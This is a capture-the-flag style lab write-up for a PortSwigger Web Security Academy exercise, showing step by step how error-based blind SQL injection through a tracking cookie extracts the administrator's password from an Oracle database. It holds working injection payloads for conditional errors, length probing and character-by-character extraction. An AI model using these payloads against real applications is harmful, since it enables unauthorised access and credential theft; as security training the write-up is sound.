# Lab: Blind SQL Injection with Conditional Errors (Oracle)

## Objective

Exploit a blind SQL injection vulnerability to retrieve the password of the `administrator` user.

## Context

The application uses a tracking cookie (`TrackingId`) which is included in a backend SQL query:

```sql
SELECT tracking_id FROM tracking_table WHERE tracking_id = 'cookie-value'
```

- Query results are not returned
- Application behavior does not change based on query results
- BUT: database errors trigger a visible response (HTTP 500)

This enables **error-based blind SQL injection**.

---

## Step 1 — Confirm Injection Point

Modify the cookie:

```http
TrackingId=4QrSLFQnwFzCOeCS'
```

Response:
```
Internal Server Error
```

Injection point confirmed.

---

## Step 2 — Analyze Error Behavior

Test valid vs invalid queries:

```sql
' || (SELECT '' FROM dual) || '        -- No error
' || (SELECT '' FROM no_existe) || '  -- Error
```

Conclusion:
- The application exposes database errors
- SQL injection is viable

---

## Step 3 — Conditional Error Injection

```sql
' || (SELECT CASE WHEN 1=1 THEN TO_CHAR(1/0) ELSE NULL END FROM dual) || '
```

→ Error

```sql
' || (SELECT CASE WHEN 1=2 THEN TO_CHAR(1/0) ELSE NULL END FROM dual) || '
```

→ No error

Conclusion:
- We can evaluate boolean conditions via error responses

---

## Step 4 — Confirm Table Existence

```sql
' || (SELECT '' FROM users WHERE ROWNUM = 1) || '
```

→ No error → table exists

---

## Step 5 — Confirm User Exists

```sql
' || (SELECT CASE 
    WHEN (SELECT username FROM users WHERE username='administrator') = 'administrator' 
    THEN TO_CHAR(1/0) 
    ELSE NULL 
END FROM dual) || '
```

→ Error → user exists

---

## Step 6 — Determine Password Length

```sql
' || (SELECT CASE 
    WHEN (SELECT LENGTH(password) FROM users WHERE username='administrator') > 1 
    THEN TO_CHAR(1/0) 
    ELSE NULL 
END FROM dual) || '
```

Using Burp Suite Intruder:
- Increase the value in `> X`
- Observe when the error disappears

Result:
- Password length = **20**

---

## Step 7 — Extract Password

Use binary search on ASCII values:

```sql
ASCII(SUBSTR(password, position, 1)) > mid
```

Combined with:

```sql
CASE WHEN condition THEN TO_CHAR(1/0)
```

Extract each character iteratively.

---

## Automation

The process was automated using a custom Python script:

```bash
../automation/
```

The script:
- Detects DBMS
- Determines password length
- Extracts characters efficiently using binary search

---

## Key Takeaways

- Error-based blind SQLi enables data extraction without visible output
- Conditional queries allow boolean inference
- Binary search significantly improves extraction performance
- Understanding DBMS behavior (Oracle `dual`, `ROWNUM`) is critical

---

## Skills Demonstrated

- Manual exploitation of blind SQL injection
- Payload construction and reasoning
- Use of Burp Suite (Intruder)
- Automation of attack patterns
- Backend behavior analysis

---

## Disclaimer

All testing was performed in a controlled lab environment (PortSwigger Web Security Academy).
